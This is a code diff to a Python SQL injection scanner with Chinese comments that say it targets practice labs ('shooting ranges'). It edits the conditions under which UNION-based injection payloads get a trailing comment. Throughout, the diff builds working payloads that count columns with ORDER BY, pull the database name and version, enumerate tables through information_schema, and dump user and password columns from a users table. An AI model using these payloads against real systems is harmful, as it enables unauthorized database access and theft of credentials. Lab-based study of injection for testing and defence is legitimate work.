@@ -449,7 +449,7 @@ class SQLInjectionScanner:
         
         # 首先尝试使用ORDER BY 来快速确定字段数
         for i in range(1, 11):  # 测试到10个字段
-            test_payload = f"{payload} ORDER BY {i} # " if method == 'GET' else f"{payload} ORDER BY {i}"
+            test_payload = f"{payload} ORDER BY {i} # " if payload != "-1" else f"{payload} ORDER BY {i}"
             
             if method == 'GET':
                 # 根据靶场类型决定submit参数名和值
@@ -510,8 +510,8 @@ class SQLInjectionScanner:
         select_ones = ",".join(["1"] * column_count)
         select_twos = ",".join(["2"] * column_count)
 
-        payload_ones = f"{payload} union select {select_ones} # " if method == 'GET' else f"{payload} union select {select_ones}"
-        payload_twos = f"{payload} union select {select_twos} # " if method == 'GET' else f"{payload} union select {select_twos}"
+        payload_ones = f"{payload} union select {select_ones} # " if payload != "-1" else f"{payload} union select {select_ones}"
+        payload_twos = f"{payload} union select {select_twos} # " if payload != "-1" else f"{payload} union select {select_twos}"
         
         # if closing_pattern == "string":
         #     payload_ones = f"vince' union select {select_ones} # "
@@ -594,7 +594,7 @@ class SQLInjectionScanner:
         union_select = ",".join(select_parts)
         
         # 根据不同的闭合模式构造payload
-        union_payload = f"{payload} union select {union_select} # " if method == 'GET' else f"{payload} union select {union_select}"
+        union_payload = f"{payload} union select {union_select} # " if payload != "-1" else f"{payload} union select {union_select}"
         # if closing_pattern == "string":
         #     union_payload = f"vince' union select {union_select} # "
         # elif closing_pattern == "search":
@@ -664,7 +664,7 @@ class SQLInjectionScanner:
         
         if column_count >= 2:
             # 动态构造payload
-            test_payload = f"{payload} union select concat(database(),'|',version()),{union_select} # " if method == 'GET' else f"{payload} union select concat(database(),'|',version()),{union_select}"
+            test_payload = f"{payload} union select concat(database(),'|',version()),{union_select} # " if payload != "-1" else f"{payload} union select concat(database(),'|',version()),{union_select}"
             # if closing_pattern == "string":
             #     payload = f"vince' union select {union_select},concat(database(),'|',version()) # "
             # elif closing_pattern == "search":
@@ -844,7 +844,7 @@ class SQLInjectionScanner:
         }
         
         # 构造查询payload
-        test_payload = f"{payload} union select group_concat(table_name),{union_select} from information_schema.tables WHERE table_schema=database() # " if method == 'GET' else f"{payload} union select group_concat(table_name),{union_select} from information_schema.tables WHERE table_schema=database()"
+        test_payload = f"{payload} union select group_concat(table_name),{union_select} from information_schema.tables WHERE table_schema=database() # " if payload != "-1" else f"{payload} union select group_concat(table_name),{union_select} from information_schema.tables WHERE table_schema=database()"
         # if closing_pattern == "string":
         #     payload = f"vince' union select {union_select},group_concat(table_name) from information_schema.tables WHERE table_schema=database() # "
         # elif closing_pattern == "search":
@@ -1113,7 +1113,7 @@ class SQLInjectionScanner:
                 2:"user,password",
                 3:"user,password,1",
             }
-        test_payload = f"{payload} union select {dict[column_count]} from users # " if method == 'GET' else f"{payload} union select {dict[column_count]} from users"
+        test_payload = f"{payload} union select {dict[column_count]} from users # " if payload != "-1" else f"{payload} union select {dict[column_count]} from users"
         # if closing_pattern == "string":
         #     if column_count >= 2:
         #         payload = f"vince' union select username,password from users # "
